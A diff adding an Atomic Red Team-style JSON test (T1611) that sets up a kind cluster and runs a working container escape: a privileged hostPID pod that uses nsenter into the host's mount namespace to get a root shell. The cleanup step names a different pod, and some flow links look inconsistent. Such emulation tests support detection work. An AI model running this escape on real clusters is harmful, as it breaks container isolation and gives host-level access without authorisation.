@@ -1,0 +1,309 @@
+{
+  "id": "0b2f9520-a17a-4671-9dba-3bd034099fff",
+  "name": "Deploy container using nsenter container escape",
+  "description": "In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.\n\nAdditional Details:\n- https://twitter.com/mauilion/status/1129468485480751104\n- https://securekubernetes.com/scenario_2_attack/\n",
+  "platforms": [
+    "containers"
+  ],
+  "steps": [
+    {
+      "id": "57c5f552-6330-43da-ad4f-886139450a36",
+      "type": "execute-command",
+      "data": {
+        "command": "kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ec939340-2746-4caa-ac85-f5273974a062",
+      "type": "execute-command",
+      "data": {
+        "command": "kubectl --context kind-atomic-cluster delete pod atomic-escape-pod\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ac848d04-7ae5-4afd-b9cb-60d471903775",
+      "name": "Check dependency 1/5",
+      "description": "Verify docker is installed.",
+      "type": "execute-command",
+      "data": {
+        "command": "which docker\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b1a995ec-b56b-4f31-b44f-7460f8d444c0",
+      "name": "Resolve dependency 1/5",
+      "description": "Verify docker is installed.",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "e5a16b1c-ff7d-4a9f-b2ae-7aa5d7b38131",
+      "name": "Re-check dependency 1/5",
+      "description": "Verify docker is installed.",
+      "type": "execute-command",
+      "data": {
+        "command": "which docker\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "1b84ede5-5a5d-45a6-80c4-d240f8980454",
+      "name": "Check dependency 2/5",
+      "description": "Verify docker service is running.",
+      "type": "execute-command",
+      "data": {
+        "command": "sudo systemctl status docker\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "3e3516a8-4bc3-46d1-b168-f8469d958458",
+      "name": "Resolve dependency 2/5",
+      "description": "Verify docker service is running.",
+      "type": "execute-command",
+      "data": {
+        "command": "sudo systemctl start docker\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "6a366070-2197-49b9-9b96-dfe8eb493267",
+      "name": "Re-check dependency 2/5",
+      "description": "Verify docker service is running.",
+      "type": "execute-command",
+      "data": {
+        "command": "sudo systemctl status docker\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "dbd9b5bb-25e1-4757-9a78-cfe47042be13",
+      "name": "Check dependency 3/5",
+      "description": "Verify kind is in the path.",
+      "type": "execute-command",
+      "data": {
+        "command": "which kind\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "c7065359-fa11-4d4e-bb3c-abfb8e2320c0",
+      "name": "Resolve dependency 3/5",
+      "description": "Verify kind is in the path.",
+      "type": "execute-command",
+      "data": {
+        "command": "curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64\nchmod +x ./kind\nmv kind /usr/bin/kind\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d44d19a8-12f5-4fb2-b276-d508dba64697",
+      "name": "Re-check dependency 3/5",
+      "description": "Verify kind is in the path.",
+      "type": "execute-command",
+      "data": {
+        "command": "which kind\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0ea4543e-a9dc-49f9-961c-a74a1aff9cbf",
+      "name": "Check dependency 4/5",
+      "description": "Verify kind-atomic-cluster is created",
+      "type": "execute-command",
+      "data": {
+        "command": "sudo kind get clusters\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8ef240eb-05cf-4023-93df-8750c492209d",
+      "name": "Resolve dependency 4/5",
+      "description": "Verify kind-atomic-cluster is created",
+      "type": "execute-command",
+      "data": {
+        "command": "sudo kind create cluster --name atomic-cluster\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "1b675632-9912-4b6a-b032-86098ec1b972",
+      "name": "Re-check dependency 4/5",
+      "description": "Verify kind-atomic-cluster is created",
+      "type": "execute-command",
+      "data": {
+        "command": "sudo kind get clusters\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0feaebaf-0ca1-4b75-87c6-9ab0ec51f9b0",
+      "name": "Check dependency 5/5",
+      "description": "Verify kubectl is in path",
+      "type": "execute-command",
+      "data": {
+        "command": "which kubectl\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5096d980-8cb7-4739-98c2-5fe68a82bc7b",
+      "name": "Resolve dependency 5/5",
+      "description": "Verify kubectl is in path",
+      "type": "execute-command",
+      "data": {
+        "command": "curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod +x ./kubectl\nmv kubectl /usr/bin/kubectl\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "fd92759d-dbaf-4ec4-917e-42b2253d2ea1",
+      "name": "Re-check dependency 5/5",
+      "description": "Verify kubectl is in path",
+      "type": "execute-command",
+      "data": {
+        "command": "which kubectl\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "57c5f552-6330-43da-ad4f-886139450a36",
+      "p": "on-success",
+      "o": "ec939340-2746-4caa-ac85-f5273974a062"
+    },
+    {
+      "s": "57c5f552-6330-43da-ad4f-886139450a36",
+      "p": "on-failure",
+      "o": "ec939340-2746-4caa-ac85-f5273974a062"
+    },
+    {
+      "s": "ac848d04-7ae5-4afd-b9cb-60d471903775",
+      "p": "on-success",
+      "o": "57c5f552-6330-43da-ad4f-886139450a36"
+    },
+    {
+      "s": "ac848d04-7ae5-4afd-b9cb-60d471903775",
+      "p": "on-failure",
+      "o": "b1a995ec-b56b-4f31-b44f-7460f8d444c0"
+    },
+    {
+      "s": "b1a995ec-b56b-4f31-b44f-7460f8d444c0",
+      "p": "on-success",
+      "o": "e5a16b1c-ff7d-4a9f-b2ae-7aa5d7b38131"
+    },
+    {
+      "s": "e5a16b1c-ff7d-4a9f-b2ae-7aa5d7b38131",
+      "p": "on-failure",
+      "o": "57c5f552-6330-43da-ad4f-886139450a36"
+    },
+    {
+      "s": "1b84ede5-5a5d-45a6-80c4-d240f8980454",
+      "p": "on-success",
+      "o": "57c5f552-6330-43da-ad4f-886139450a36"
+    },
+    {
+      "s": "1b84ede5-5a5d-45a6-80c4-d240f8980454",
+      "p": "on-failure",
+      "o": "3e3516a8-4bc3-46d1-b168-f8469d958458"
+    },
+    {
+      "s": "3e3516a8-4bc3-46d1-b168-f8469d958458",
+      "p": "on-success",
+      "o": "6a366070-2197-49b9-9b96-dfe8eb493267"
+    },
+    {
+      "s": "6a366070-2197-49b9-9b96-dfe8eb493267",
+      "p": "on-failure",
+      "o": "57c5f552-6330-43da-ad4f-886139450a36"
+    },
+    {
+      "s": "dbd9b5bb-25e1-4757-9a78-cfe47042be13",
+      "p": "on-success",
+      "o": "57c5f552-6330-43da-ad4f-886139450a36"
+    },
+    {
+      "s": "dbd9b5bb-25e1-4757-9a78-cfe47042be13",
+      "p": "on-failure",
+      "o": "c7065359-fa11-4d4e-bb3c-abfb8e2320c0"
+    },
+    {
+      "s": "c7065359-fa11-4d4e-bb3c-abfb8e2320c0",
+      "p": "on-success",
+      "o": "d44d19a8-12f5-4fb2-b276-d508dba64697"
+    },
+    {
+      "s": "d44d19a8-12f5-4fb2-b276-d508dba64697",
+      "p": "on-failure",
+      "o": "57c5f552-6330-43da-ad4f-886139450a36"
+    },
+    {
+      "s": "0ea4543e-a9dc-49f9-961c-a74a1aff9cbf",
+      "p": "on-success",
+      "o": "57c5f552-6330-43da-ad4f-886139450a36"
+    },
+    {
+      "s": "0ea4543e-a9dc-49f9-961c-a74a1aff9cbf",
+      "p": "on-failure",
+      "o": "8ef240eb-05cf-4023-93df-8750c492209d"
+    },
+    {
+      "s": "8ef240eb-05cf-4023-93df-8750c492209d",
+      "p": "on-success",
+      "o": "1b675632-9912-4b6a-b032-86098ec1b972"
+    },
+    {
+      "s": "1b675632-9912-4b6a-b032-86098ec1b972",
+      "p": "on-failure",
+      "o": "57c5f552-6330-43da-ad4f-886139450a36"
+    },
+    {
+      "s": "0feaebaf-0ca1-4b75-87c6-9ab0ec51f9b0",
+      "p": "on-success",
+      "o": "57c5f552-6330-43da-ad4f-886139450a36"
+    },
+    {
+      "s": "0feaebaf-0ca1-4b75-87c6-9ab0ec51f9b0",
+      "p": "on-failure",
+      "o": "5096d980-8cb7-4739-98c2-5fe68a82bc7b"
+    },
+    {
+      "s": "5096d980-8cb7-4739-98c2-5fe68a82bc7b",
+      "p": "on-success",
+      "o": "fd92759d-dbaf-4ec4-917e-42b2253d2ea1"
+    },
+    {
+      "s": "fd92759d-dbaf-4ec4-917e-42b2253d2ea1",
+      "p": "on-failure",
+      "o": "57c5f552-6330-43da-ad4f-886139450a36"
+    }
+  ],
+  "tags": [
+    "T1611",
+    "atomic-red-team"
+  ]
+}
